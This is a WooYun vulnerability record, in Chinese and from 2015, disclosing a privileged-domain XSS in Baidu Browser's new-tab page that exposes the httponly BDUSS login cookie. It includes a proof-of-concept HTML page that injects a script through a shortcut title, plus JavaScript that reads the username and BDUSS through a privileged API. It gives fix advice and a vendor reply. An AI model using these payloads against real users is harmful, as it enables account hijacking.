{"id": 73347, "wybug_id": "wooyun-2015-0145911", "wybug_title": "百度浏览器缺陷可导致BDUSS泄漏", "wybug_corp": "百度", "wybug_author": "隐形人真忙", "wybug_date": "2015-10-11 09:10", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行", "客户端安全", "浏览器漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-14：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： 发现了一处特权域的XSS，发现可以结合API获取到百度认证cookie BDUSS。 详细说明：  -----------------------0x00 特权域XSS-----------------------在bdbrowser://newtab域中，有个常用网址功能，但是没有对title进行有效处理，导致XSS。设置常用网址，只需要给用户一个网址，发现只要在页面中设置js多reload几次就能自动存留在这个popup window中。Poc.html：\n<!DOCTYPE html><html><head><title><script src=\"http://127.0.0.1/browser/test.js\"></script></title></head><body>test for baidu browser<script type=\"text/javascript\">    for(var i = 0; i < 10; i++){        location.reload() ;    }</script></body></html>\n上面的title设置成一个script，用来加载外部js执行。\n\n刷新页面，就可以看到这个title没有过滤就输出到页面上。---------------------------0x01 认证cookie泄露----------------------------特权域存在的XSS不同于其他互联网域的XSS，配合浏览器的特权API，可以做很多事情。这个案例里，排查了很多API，暂时没有找到新的能够命令执行的方法。但是可以获取认证cookie，比如在一般的网站中，很难获取到百度账号的cookie BDUSS，这个cookie一般是设置为httponly的，但是在特权域轻而易举。bdbrowser://newtab中存在Request对象，可以执行一些操作，比如篡改主页、读取历史记录、收藏夹等。这里展示的是获取浏览器账户的BDUSS，test.js：\n//获取用户名+BDUSSo = require(\"common/external\")o.send(\"account_get_userinfo\",[], function(e,t){    var username = t.body.display_name ;    var bduss = t.body.bduss ;    alert(username + \" : \" + bduss) ;});\n效果如下：\n\n   漏洞证明：  \n\n   修复方案：  1、修复特权域XSS2、在bdbrowser中控制好执行特权API的域。   版权声明：转载请注明来源 隐形人真忙@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-10-11 11:05 厂商回复： 感谢提交 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-12 11:46 |    \t\t这只猪 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:5        | )(2009年荣获CCAV首届挖洞大使称号)(★★★...)\t\t \n  卧槽，今天公开漏洞真多，都看不过来了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}